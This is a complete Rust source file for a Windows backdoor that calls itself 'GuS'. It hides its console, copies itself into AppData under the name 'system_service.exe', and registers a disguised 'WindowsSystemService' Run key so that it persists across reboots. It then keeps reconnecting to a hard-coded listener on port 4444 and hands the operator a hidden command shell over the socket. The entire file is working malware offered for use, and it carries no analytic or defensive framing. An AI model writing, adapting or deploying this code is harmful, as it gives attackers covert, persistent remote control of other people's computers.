use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{Read, Write, Error, ErrorKind};
use std::thread;
use std::time::Duration;
use std::env;
use std::fs;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use std::error::Error as StdError;
use winapi::um::wincon::FreeConsole;
use std::os::windows::process::CommandExt;

const REMOTE_HOST: &str = "192.168.1.154"; // Change this to the IP of your listening machine
const REMOTE_PORT: u16 = 4444;        // Change this to your listening port
const RETRY_DELAY: Duration = Duration::from_secs(5); // Wait 5 seconds between reconnection attempts

macro_rules! debug {
    ($($e:expr),*) => {
        {
            #[cfg(debug_assertions)]
            {
                println!($($e),*);
            }
        }
    };
}

// Will continue upon a bad write, intended for use in only the connection loop
macro_rules! check_write {
    ($s:ident, $m:expr, $f:ident) => {
        if let Err(e) = $s.write_all($m) {
            debug!("Stream failed to write: {}", e);
            thread::sleep(RETRY_DELAY);
            $f = true; // Sets the conn_down flag to true.
            continue;
        }
    };
}

// Will continue upon a bad read, intended for use in only the connection loop
macro_rules! check_read {
    ($s:ident, $f:ident) => {
        {
            let mut buf = vec![0; 1024];
            let command = match $s.read(&mut buf) {
                Ok(0) => {
                    thread::sleep(RETRY_DELAY);
                    debug!("Failed at a check_read!");
                    $f = true;
                    continue;
                },
                Ok(n) => String::from_utf8_lossy(&buf[0..n]).to_string(),
                Err(_) => {
                    thread::sleep(RETRY_DELAY);
                    debug!("Failed at a check_read!");
                    $f = true;
                    continue;
                }
            };

            command
        }
    };
}

fn main() {

    unsafe { FreeConsole() };
    
    // Set up persistence if not already installed
    setup_persistence().unwrap_or_else(|e| {
        debug!("Failed to set up persistence: {}", e);
    });
    
    // Main reconnection loop
    let mut conn_down = false;
    let mut stream: TcpStream = init_connection();
    loop {

        if conn_down == true {
            debug!("Attempting to connect to {}:{}", REMOTE_HOST, REMOTE_PORT);
            stream = init_connection();
            conn_down = false; // init_connection() is blocking until a valid connection is made.
        }

        check_write!(stream, b"GuS >", conn_down);

        let command = check_read!(stream, conn_down);

        match command.trim() {
            "shell" => {
                match create_shell(&mut stream) {
                    Ok(_) => debug!("Shell session completed. Reconnecting..."),
                    Err(e) => debug!("Error occurred: {}. Reconnecting...", e),
                }
            },
            "help" => {
                check_write!(stream, b"\
                Commands do not have arguments, they will display their own prompts!\n\
                help > Show this menu\n\
                shell > Drop into a Windows shell\n\
                exit > When in a shell, will exit the process\n\
                ", conn_down);
            }
            &_ => {
                check_write!(stream, b"Bad Command.\n", conn_down);
            }
        }

    }
}

fn setup_persistence() -> Result<(), Box<dyn StdError>> {
    // Get the current executable path
    let current_exe = env::current_exe()?;
    
    // Construct the target path in AppData\Roaming
    let appdata = env::var("APPDATA").unwrap_or_else(|_| String::from(""));
    let target_dir = PathBuf::from(&appdata).join("WindowsService");
    let target_path = target_dir.join("system_service.exe");
    
    // Create directory if it doesn't exist
    fs::create_dir_all(&target_dir)?;
    
    // Copy executable to target location if not already there
    if !target_path.exists() || current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
        debug!("Installed to: {}", target_path.display());
        
        // Create startup registry entry using the winreg crate
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
        let (key, _) = hkcu.create_subkey(path)?;
        
        key.set_value("WindowsSystemService", &target_path.to_string_lossy().to_string())?;
        debug!("Added startup registry entry");
    }
    
    Ok(())
}

fn create_shell(stream: &mut TcpStream) -> Result<(), Box<dyn StdError>> {
   
    stream.write_all("GuS - Pick a Shell (ex. cmd.exe): ".as_bytes())?;

    let mut buf = vec![0; 1024];

    let shell = match stream.read(&mut buf) {
        Ok(0) => return Err(Box::new(Error::from(ErrorKind::ConnectionReset))),
        Ok(n) => String::from_utf8_lossy(&buf[0..n]).to_string(),
        Err(e) => return Err(Box::new(e)),
    };

    debug!("Creating shell: {}", shell.trim());
    
    // Create a command shell process
    let mut cmd = Command::new(shell.trim())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .creation_flags(0x08000000)// CREATE_NO_WINDOW Flag.
        .spawn()?;
    
    let mut stdin = cmd.stdin.take().unwrap();
    let mut stdout = cmd.stdout.take().unwrap();
    let mut stderr = cmd.stderr.take().unwrap();
    
    // Clone the stream for the input thread
    let mut input_stream = stream.try_clone()?;
    
    // Thread to read from remote and write to process stdin
    let stdin_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match input_stream.read(&mut buffer) {
                Ok(0) => break, // Connection closed
                Ok(n) => {
                    if "exit" == String::from_utf8_lossy(&buffer[0..n]).trim() {
                        break;
                    }
                    if stdin.write_all(&buffer[0..n]).is_err() {
                        break;
                    }
                },
                Err(_) => break,
            }
        }

        debug!("stdin thread died.");
    });
    
    // Thread to read from process stdout and write to remote
    let mut output_stream = stream.try_clone()?;
    let stdout_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stdout.read(&mut buffer) {
                Ok(0) => break, // Process closed stdout
                Ok(n) => {
                    if output_stream.write_all(&buffer[0..n]).is_err() {
                        break;
                    }
                },
                Err(_) => break,
            }
        }

        debug!("stdout thread died.");
    });
    
    // Thread to read from process stderr and write to remote
    let mut error_stream = stream.try_clone()?;
    let stderr_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        loop {
            match stderr.read(&mut buffer) {
                Ok(0) => break, // Process closed stderr
                Ok(n) => {
                    if error_stream.write_all(&buffer[0..n]).is_err() {
                        break;
                    }
                },
                Err(_) => break,
            }
        }

        debug!("stderr thread died.");
    });

    // Thread continues to block until either the stdios die or the process dies.
    let closing_thread = thread::spawn(move || {

        loop {
            match cmd.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => (),
                Err(_) => break,
            }

            if stdin_thread.is_finished() || stdout_thread.is_finished() || stderr_thread.is_finished() {
                let _ = cmd.kill();
                break;
            }
        }

    });

    closing_thread.join().unwrap();
    
    Ok(())
}

fn init_connection() -> TcpStream {
    loop {
        match TcpStream::connect(format!("{}:{}", REMOTE_HOST, REMOTE_PORT)) {
            Ok(s) => return s,
            Err(_) => {
                thread::sleep(RETRY_DELAY);
            }
        }
    }
}